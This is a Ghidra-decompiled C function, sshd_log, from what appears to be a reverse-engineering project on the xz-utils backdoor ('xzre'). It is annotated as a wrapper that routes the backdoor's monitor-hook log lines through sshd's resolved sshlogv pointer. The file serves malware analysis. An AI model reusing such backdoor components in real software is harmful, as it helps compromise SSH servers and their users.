// /home/kali/xzre-ghidra/xzregh/107400_sshd_log.c
// Function: sshd_log @ 0x107400
// Calling convention: unknown
// Prototype: undefined sshd_log(void)


/*
 * AutoDoc: Wraps sshd's sshlogv() implementation by rebuilding a va_list on the stack, saving/restoring
 * XMM registers when necessary, and then tail-calling the resolved function pointer in the log
 * context. Every monitor hook routes formatted log lines through here so it matches OpenSSH's
 * logging ABI without needing libc wrappers.
 */
#include "xzre_types.h"


void sshd_log(undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4,
             undefined8 param_5,undefined8 param_6,undefined8 param_7,undefined8 param_8,
             long param_9,undefined4 param_10,undefined8 param_11,undefined8 param_12,
             undefined8 param_13,undefined8 param_14)

{
  char in_AL;
  undefined1 va_list_state;
  undefined4 saved_xmm;
  undefined4 local_cc;
  undefined1 *local_c8;
  undefined1 *local_c0;
  undefined1 local_b8 [24];
  undefined8 local_a0;
  undefined8 local_98;
  undefined8 local_90;
  undefined8 local_88;
  undefined8 local_78;
  undefined8 local_68;
  undefined8 local_58;
  undefined8 local_48;
  undefined8 local_38;
  undefined8 local_28;
  undefined8 local_18;
  
  if (in_AL != '\0') {
    local_88 = param_1;
    local_78 = param_2;
    local_68 = param_3;
    local_58 = param_4;
    local_48 = param_5;
    local_38 = param_6;
    local_28 = param_7;
    local_18 = param_8;
  }
  va_list_state = 0;
  local_c8 = &stack0x00000008;
  saved_xmm = 0x18;
  local_c0 = local_b8;
  local_cc = 0x30;
  local_a0 = param_12;
  local_98 = param_13;
  local_90 = param_14;
  (**(code **)(param_9 + 0x58))(&va_list_state,&va_list_state,0,0,param_10,0,param_11,&saved_xmm);
  return;
}

